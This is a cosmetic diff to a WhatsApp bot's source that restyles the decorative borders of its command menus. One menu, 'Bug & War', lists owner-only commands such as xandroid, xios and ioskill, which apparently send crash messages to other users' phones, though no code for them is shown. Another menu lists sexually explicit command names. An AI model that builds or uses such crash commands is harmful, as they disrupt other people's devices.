 │${setv} ${prefix} tflimit ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -22571,17 +22571,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'funmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Fun* 」✿
+╰─┬────✿
+╭─┴✿「 *Fun* 」✿
 │${setv} ${prefix}define ❄️
 │${setv} ${prefix}readmore ❄️
 │${setv} ${prefix}fact ❄️
@@ -22646,7 +22646,7 @@ let xmenu_oh = `
 │${setv} ${prefix}feed ❄️
 │${setv} ${prefix}checkme ❄️
 │${setv} ${prefix}sound1 - sound161 ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -22997,17 +22997,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'stickermenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Sticker* 」✿
+╰─┬────✿
+╭─┴✿「 *Sticker* 」✿
 │${setv} ${prefix}goose ❄️
 │${setv} ${prefix}woof ❄️
 │${setv} ${prefix}8ball ❄️
@@ -23015,7 +23015,7 @@ let xmenu_oh = `
 │${setv} ${prefix}meow ❄️
 │${setv} ${prefix}gura ❄️
 │${setv} ${prefix}telestick ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -23366,17 +23366,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'animemenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Anime* 」✿
+╰─┬────✿
+╭─┴✿「 *Anime* 」✿
 │${setv} ${prefix}stickhandhold ❄️
 │${setv} ${prefix}stickshinobu ❄️
 │${setv} ${prefix}stickcuddle ❄️
@@ -23512,7 +23512,7 @@ let xmenu_oh = `
 │${setv} ${prefix}shinobu ❄️
 │${setv} ${prefix}fox_girl ❄️
 │${setv} ${prefix}gecg ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -23863,17 +23863,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'nsfwmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Anime NSFW* 」✿
+╰─┬────✿
+╭─┴✿「 *Anime NSFW* 」✿
 │${setv} ${prefix}hentai ❄️
 │${setv} ${prefix}gifblowjob ❄️
 │${setv} ${prefix}hentaivid ❄️
@@ -23888,7 +23888,7 @@ let xmenu_oh = `
 │${setv} ${prefix}pussy ❄️
 │${setv} ${prefix}yuri ❄️
 │${setv} ${prefix}zettai ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -24239,17 +24239,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'databasemenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Database* 」✿
+╰─┬────✿
+╭─┴✿「 *Database* 」✿
 │${setv} ${prefix}setcmd 👑
 │${setv} ${prefix}delcmd 👑
 │${setv} ${prefix}listcmd ❄️
@@ -24258,7 +24258,7 @@ let xmenu_oh = `
 │${setv} ${prefix}delmsg 👑
 │${setv} ${prefix}getmsg ❄️
 │${setv} ${prefix}listmsg ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -24609,23 +24609,23 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'storemenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Store* 」✿
+╰─┬────✿
+╭─┴✿「 *Store* 」✿
 │${setv} ${prefix}list ❄️
 │${setv} ${prefix}store ❄️
 │${setv} ${prefix}shop ❄️
 │${setv} ${prefix}addlist 👑
 │${setv} ${prefix}dellist 👑
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -24976,21 +24976,21 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'religionmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Religon* 」✿
+╰─┬────✿
+╭─┴✿「 *Religon* 」✿
 │${setv} ${prefix}bible ❄️
 │${setv} ${prefix}quran ❄️
 │${setv} ${prefix}gita ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -25341,17 +25341,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'bugmenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Bug & War* 」✿
+╰─┬────✿
+╭─┴✿「 *Bug & War* 」✿
 │${setv} ${prefix}xandroid 👑
 │${setv} ${prefix}xandroid2 👑
 │${setv} ${prefix}xios 👑
@@ -25361,7 +25361,7 @@ let xmenu_oh = `
 │${setv} ${prefix}🙂 👑
 │${setv} ${prefix}ioskill 👑
 │${setv} ${prefix}onekill 👑
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
@@ -25712,17 +25712,17 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'othermenu': {
 let xmenu_oh = `
-╓┈♔◦☓◦☙◦「 *GREETING* 」✿
+╭──✿「 *GREETING* 」✿
 ├ *Hi 👋*
 ├ *${m.pushName}* 
 ├ *${xeonytimewisher} 😄* 
-╚═══*.·:·.☽✧ ${readmore}
-╓┈♔◦☓◦☙◦「 *GUIDE* 」✿
+╰─┬────✿ ${readmore}
+╭─┴✿「 *GUIDE* 」✿
 ├ *👑 = For Owner* 
 ├ *❄️ = For Free User*
 ├ *🌟 = For Premium User*
-╚═══*.·:·.☽✧
-╓┈♔◦☓◦☙◦「 *Other* 」✿
+╰─┬────✿
+╭─┴✿「 *Other* 」✿
 │${setv} ${prefix}update ❄️
 │${setv} ${prefix}ping ❄️
 │${setv} ${prefix}menu ❄️
@@ -25739,7 +25739,7 @@ let xmenu_oh = `
 │${setv} ${prefix}q ❄️
 │${setv} ${prefix}inspect ❄️
 │${setv} ${prefix}tagme ❄️
-╚═══*.·:·.☽✧`
+╰──────✿`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         image: fs.readFileSync('./AlyaMedia/theme/alyapic.jpg'),
